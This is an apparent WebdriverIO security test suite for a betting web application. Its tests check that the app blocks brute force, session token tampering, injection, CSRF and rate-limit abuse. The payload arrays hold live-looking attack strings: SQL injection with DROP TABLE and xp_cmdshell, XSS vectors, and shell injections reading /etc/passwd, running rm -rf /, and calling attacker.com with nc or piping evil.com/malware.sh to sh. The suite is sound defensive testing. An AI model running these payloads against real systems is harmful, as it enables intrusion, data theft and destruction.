const LoginPage = require('../pageobjects/login.page');
const BettingPage = require('../pageobjects/betting.page');
const ProfilePage = require('../pageobjects/profile.page');
const SecurityUtils = require('../utils/security.util');
const MLFraudDetector = require('../utils/ml-fraud-detector');

describe('🛡️ Comprehensive Security Testing Suite', () => {
    
    beforeEach(async () => {
        await browser.url('/');
        await SecurityUtils.clearSecurityState();
    });

    describe('🔐 Authentication Security', () => {
        
        it('should prevent brute force attacks', async () => {
            await allure.addLabel('epic', 'Security');
            await allure.addLabel('feature', 'Authentication');
            await allure.addLabel('severity', 'critical');
            
            const maliciousAttempts = [
                'admin', 'password', '123456', 'admin123', 'root',
                'password123', 'qwerty', 'letmein', 'welcome', 'monkey'
            ];
            
            let successfulAttempts = 0;
            let captchaTriggered = false;
            let accountLocked = false;
            
            for (let i = 0; i < maliciousAttempts.length; i++) {
                await LoginPage.login('admin', maliciousAttempts[i]);
                
                if (await LoginPage.isLoggedIn()) {
                    successfulAttempts++;
                }
                
                if (await LoginPage.isCaptchaDisplayed()) {
                    captchaTriggered = true;
                    await allure.addStep(`CAPTCHA triggered after ${i + 1} attempts`);
                    break;
                }
                
                if (await LoginPage.isAccountLocked()) {
                    accountLocked = true;
                    await allure.addStep(`Account locked after ${i + 1} attempts`);
                    break;
                }
                
                await browser.pause(500); // Simulate rapid attempts
            }
            
            expect(successfulAttempts).toBe(0);
            expect(captchaTriggered || accountLocked).toBe(true);
            await allure.addAttachment('Brute Force Protection', 
                `CAPTCHA: ${captchaTriggered}, Account Locked: ${accountLocked}`, 'text/plain');
        });

        it('should enforce session timeout security', async () => {
            await allure.addLabel('severity', 'high');
            
            await LoginPage.login('testuser', 'password123');
            expect(await LoginPage.isLoggedIn()).toBe(true);
            
            // Simulate inactivity
            await SecurityUtils.simulateInactivity(1800000); // 30 minutes
            
            // Try to access protected resource
            await BettingPage.open();
            
            expect(await LoginPage.isOnLoginPage()).toBe(true);
            await allure.addStep('Session timeout enforced after 30 minutes of inactivity');
        });

        it('should prevent session hijacking', async () => {
            await allure.addLabel('severity', 'critical');
            
            await LoginPage.login('testuser', 'password123');
            const originalSessionToken = await SecurityUtils.getSessionToken();
            
            // Simulate session token manipulation
            const manipulatedTokens = [
                originalSessionToken.slice(0, -5) + 'XXXXX',
                originalSessionToken + 'malicious',
                'fake_token_12345',
                originalSessionToken.replace(/[a-f]/g, '0')
            ];
            
            for (const fakeToken of manipulatedTokens) {
                await SecurityUtils.setSessionToken(fakeToken);
                await BettingPage.open();
                
                expect(await LoginPage.isOnLoginPage()).toBe(true);
                await allure.addStep(`Fake token rejected: ${fakeToken.substring(0, 10)}...`);
            }
        });
    });

    describe('💉 Injection Attack Prevention', () => {
        
        it('should prevent SQL injection in all input fields', async () => {
            await allure.addLabel('severity', 'critical');
            
            const sqlPayloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "admin'--",
                "' UNION SELECT * FROM accounts --",
                "1' OR '1'='1' /*",
                "'; EXEC xp_cmdshell('dir'); --"
            ];
            
            await LoginPage.open();
            
            for (const payload of sqlPayloads) {
                await LoginPage.enterUsername(payload);
                await LoginPage.enterPassword('password');
                await LoginPage.clickLogin();
                
                // Should not be logged in
                expect(await LoginPage.isLoggedIn()).toBe(false);
                
                // Should show appropriate error without exposing DB structure
                const errorMessage = await LoginPage.getErrorMessage();
                expect(errorMessage).not.toContain('sql');
                expect(errorMessage).not.toContain('database');
                expect(errorMessage).not.toContain('table');
                
                await allure.addStep(`SQL injection blocked: ${payload}`);
            }
        });

        it('should prevent XSS attacks in user inputs', async () => {
            await allure.addLabel('severity', 'high');
            
            const xssPayloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>"
            ];
            
            await LoginPage.login('testuser', 'password123');
            await ProfilePage.open();
            
            for (const payload of xssPayloads) {
                await ProfilePage.updateFirstName(payload);
                await ProfilePage.saveProfile();
                
                // Check that script doesn't execute
                const alertPresent = await SecurityUtils.checkForAlert();
                expect(alertPresent).toBe(false);
                
                // Check that content is properly escaped
                const displayedName = await ProfilePage.getFirstName();
                expect(displayedName).not.toContain('<script>');
                
                await allure.addStep(`XSS payload sanitized: ${payload}`);
            }
        });

        it('should prevent command injection attacks', async () => {
            await allure.addLabel('severity', 'critical');
            
            const commandPayloads = [
                "; ls -la",
                "| cat /etc/passwd", 
                "&& whoami",
                "; rm -rf /",
                "| nc attacker.com 4444",
                "&& curl evil.com/malware.sh | sh"
            ];
            
            await LoginPage.login('testuser', 'password123');
            await ProfilePage.open();
            
            for (const payload of commandPayloads) {
                await ProfilePage.updateAddress(payload);
                await ProfilePage.saveProfile();
                
                // Should not execute system commands
                const profileSaved = await ProfilePage.isProfileSaved();
                
                if (profileSaved) {
                    // If saved, ensure content is sanitized
                    const address = await ProfilePage.getAddress();
                    expect(address).not.toContain(';');
                    expect(address).not.toContain('|');
                    expect(address).not.toContain('&&');
                }
                
                await allure.addStep(`Command injection blocked: ${payload}`);
            }
        });
    });

    describe('🔒 Data Protection & Privacy', () => {
        
        it('should protect sensitive data in responses', async () => {
            await allure.addLabel('severity', 'high');
            
            await LoginPage.login('testuser', 'password123');
            
            // Check various API endpoints for data exposure
            const sensitiveEndpoints = [
                '/api/user/profile',
                '/api/betting/history', 
                '/api/account/details',
                '/api/transactions'
            ];
            
            for (const endpoint of sensitiveEndpoints) {
                const response = await SecurityUtils.makeAPIRequest(endpoint);
                const responseText = JSON.stringify(response);
                
                // Should not expose sensitive data
                expect(responseText).not.toContain('password');
                expect(responseText).not.toContain('ssn');
                expect(responseText).not.toContain('credit_card');
                expect(responseText).not.toContain('bank_account');
                expect(responseText).not.toContain('api_key');
                expect(responseText).not.toContain('secret');
                
                await allure.addStep(`Data protection verified for ${endpoint}`);
            }
        });

        it('should enforce proper access controls', async () => {
            await allure.addLabel('severity', 'critical');
            
            // Test unauthorized access to protected resources
            const protectedResources = [
                '/admin/users',
                '/admin/reports',
                '/api/internal/config',
                '/api/admin/audit-logs'
            ];
            
            // Try to access without authentication
            for (const resource of protectedResources) {
                const response = await SecurityUtils.makeAPIRequest(resource, null, false);
                expect(response.status).toBe(401);
                await allure.addStep(`Unauthorized access blocked: ${resource}`);
            }
            
            // Try to access with regular user token
            await LoginPage.login('testuser', 'password123');
            const userToken = await SecurityUtils.getSessionToken();
            
            for (const resource of protectedResources) {
                const response = await SecurityUtils.makeAPIRequest(resource, userToken);
                expect(response.status).toBe(403);
                await allure.addStep(`Insufficient privileges blocked: ${resource}`);
            }
        });
    });

    describe('🚨 Rate Limiting & DDoS Protection', () => {
        
        it('should enforce rate limiting on critical endpoints', async () => {
            await allure.addLabel('severity', 'high');
            
            const criticalEndpoints = [
                { endpoint: '/api/login', limit: 5 },
                { endpoint: '/api/betting/place', limit: 10 },
                { endpoint: '/api/password-reset', limit: 3 }
            ];
            
            for (const { endpoint, limit } of criticalEndpoints) {
                let blockedRequests = 0;
                
                // Make requests beyond the limit
                for (let i = 0; i < limit + 5; i++) {
                    const response = await SecurityUtils.makeAPIRequest(endpoint, null, true);
                    
                    if (response.status === 429) {
                        blockedRequests++;
                    }
                    
                    await browser.pause(100); // Rapid requests
                }
                
                expect(blockedRequests).toBeGreaterThan(0);
                await allure.addStep(`Rate limiting active on ${endpoint}: ${blockedRequests} requests blocked`);
            }
        });

        it('should detect and mitigate DDoS attacks', async () => {
            await allure.addLabel('severity', 'critical');
            
            const ddosAttempt = await SecurityUtils.simulateDDoSAttack({
                endpoint: '/api/betting/odds',
                requestCount: 1000,
                concurrency: 50,
                duration: 10000 // 10 seconds
            });
            
            expect(ddosAttempt.blockedRequests).toBeGreaterThan(0);
            expect(ddosAttempt.averageResponseTime).toBeLessThan(5000); // System remains responsive
            
            await allure.addAttachment('DDoS Mitigation Report', 
                JSON.stringify(ddosAttempt, null, 2), 'application/json');
        });
    });

    describe('🔍 Advanced Security Validation', () => {
        
        it('should enforce secure headers', async () => {
            await allure.addLabel('severity', 'medium');
            
            await LoginPage.open();
            const headers = await SecurityUtils.getResponseHeaders();
            
            // Check for security headers
            expect(headers['x-frame-options']).toBeDefined();
            expect(headers['x-content-type-options']).toBe('nosniff');
            expect(headers['x-xss-protection']).toBeDefined();
            expect(headers['strict-transport-security']).toBeDefined();
            expect(headers['content-security-policy']).toBeDefined();
            
            await allure.addAttachment('Security Headers', 
                JSON.stringify(headers, null, 2), 'application/json');
        });

        it('should prevent CSRF attacks', async () => {
            await allure.addLabel('severity', 'high');
            
            await LoginPage.login('testuser', 'password123');
            
            // Try to perform actions without CSRF token
            const csrfAttempts = [
                { action: 'place_bet', data: { amount: 100, match: 1 } },
                { action: 'update_profile', data: { email: 'hacker@evil.com' } },
                { action: 'change_password', data: { new_password: 'hacked123' } }
            ];
            
            for (const attempt of csrfAttempts) {
                const response = await SecurityUtils.makeCSRFRequest(attempt.action, attempt.data);
                expect(response.status).toBe(403);
                await allure.addStep(`CSRF protection active for ${attempt.action}`);
            }
        });

        it('should detect suspicious user behavior patterns', async () => {
            await allure.addLabel('severity', 'high');
            
            const fraudDetector = new MLFraudDetector();
            
            // Simulate suspicious patterns
            const suspiciousPatterns = [
                'rapid_location_changes',
                'unusual_betting_amounts', 
                'bot_like_behavior',
                'coordinated_activities'
            ];
            
            for (const pattern of suspiciousPatterns) {
                const behaviorData = await SecurityUtils.simulateSuspiciousBehavior(pattern);
                const fraudScore = await fraudDetector.analyzeUserBehavior(behaviorData);
                
                expect(fraudScore.riskLevel).toBeGreaterThan(0.6);
                expect(fraudScore.flags).toContain(pattern);
                
                await allure.addStep(`Suspicious pattern detected: ${pattern} (Score: ${fraudScore.riskLevel})`);
            }
        });
    });

    describe('📱 Mobile Security Specific Tests', () => {
        
        it('should protect against mobile-specific attacks', async () => {
            await allure.addLabel('platform', 'mobile');
            await allure.addLabel('severity', 'high');
            
            if (browser.isMobile) {
                // Test app signature validation
                const appIntegrity = await SecurityUtils.validateAppIntegrity();
                expect(appIntegrity.isTampered).toBe(false);
                
                // Test SSL pinning
                const sslPinning = await SecurityUtils.testSSLPinning();
                expect(sslPinning.isActive).toBe(true);
                
                // Test screen recording protection
                const screenProtection = await SecurityUtils.checkScreenRecordingProtection();
                expect(screenProtection.isProtected).toBe(true);
                
                await allure.addStep('Mobile security protections verified');
            } else {
                await allure.addStep('Skipped - not running on mobile device');
            }
        });

        it('should prevent mobile malware injection', async () => {
            await allure.addLabel('platform', 'mobile');
            await allure.addLabel('severity', 'critical');
            
            if (browser.isMobile) {
                // Test against known mobile attack vectors
                const malwareTests = [
                    'intent_redirection',
                    'webview_exploitation',
                    'deeplink_abuse',
                    'javascript_bridge_attacks'
                ];
                
                for (const test of malwareTests) {
                    const result = await SecurityUtils.testMobileAttackVector(test);
                    expect(result.vulnerable).toBe(false);
                    await allure.addStep(`Mobile attack vector blocked: ${test}`);
                }
            }
        });
    });

    afterEach(async () => {
        // Capture security state for analysis
        const securityState = await SecurityUtils.captureSecurityState();
        await allure.addAttachment('Security State', 
            JSON.stringify(securityState, null, 2), 'application/json');
    });
});